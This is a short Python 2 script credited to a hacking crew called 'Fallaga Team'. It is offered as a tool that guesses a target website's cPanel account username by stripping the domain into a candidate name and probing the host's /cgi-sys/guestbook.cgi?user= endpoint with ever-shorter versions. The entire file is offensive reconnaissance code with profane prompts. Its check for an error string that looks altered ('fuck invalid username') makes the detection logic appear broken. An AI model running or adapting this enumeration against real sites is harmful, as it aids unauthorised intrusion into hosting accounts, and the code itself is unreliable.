#!/usr/bin/env python

#  >>>>>>>>> Salam Alaykom <<<<<<<<<<
# Tools Fallaga Team By Wolf XTN And AnisXTN
# We Are The Tunisian Coders ;) 
# Cp G3t Us3r v1 Coded by Wolf XTN And AnisXTN
# Greetz to Our Team fallaga team
# Fb AnisXTN / www.facebook.com/anis.essid.35
# Fb WolfXTN / www.facebook.com/wolf.xtn

import urllib2
Text = raw_input('Cp G3t Us3r v1 Coded by Wolf XTN And AnisXTN Click Entre To Next >>> ')

site = raw_input('Enter a Mutherfucker website >>> ')

try:
    users = site
    if 'http://www.' in users:
        users = users.replace('http://www.', '')
    if 'http://' in users:
        users = users.replace('http://', '')
    if '.' in users:
        users = users.replace('.', '')
    if '-' in users:
        users = users.replace('-', '')
    if '/' in users:
        users = users.replace('/', '')

    while len(users) > 2:
        print users
        resp = urllib2.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
        # i can use regular expression too
        if 'fuck invalid username' not in resp.lower():
            print "\tFounded By WolfXTN & AnisXTN -> %s" %users
            pass

        users = users[:-1]

except:
    pass